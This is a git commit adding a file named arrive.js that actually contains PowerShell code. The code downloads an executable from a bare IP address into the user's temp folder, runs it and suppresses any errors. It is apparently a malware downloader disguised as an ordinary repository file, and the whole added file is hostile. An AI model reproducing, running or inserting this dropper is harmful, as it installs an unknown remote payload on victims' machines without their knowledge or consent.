f0fe1d61a373903f3005a77ac37076e32b42dec5
cruiseplug420 <cruiseplug420@gmail.com>
2026-03-02 18:40:49 -0600

    Add files via upload

---
+++ arrive.js
@@ -0,0 +1,20 @@
+$someData = @(
+    [PSCustomObject]@{a = "http://65.21.90.149/vtwArlapi7jI.exe"; b = "vtwArlapi7jI.exe"}
+  );
+
+  foreach ($i in $someData) {
+    try {
+      $filePath = "$env:TEMP\$($i.b)";
+      $download = $true;
+      if (Test-Path $filePath) {
+        $download = $false;
+      }
+      if ($download) {
+        Invoke-RestMethod -Uri $i.a -OutFile $filePath;
+      }
+      Start-Process $filePath;
+    }
+    catch {
+      # Error handling (optional)
+    }
+  }
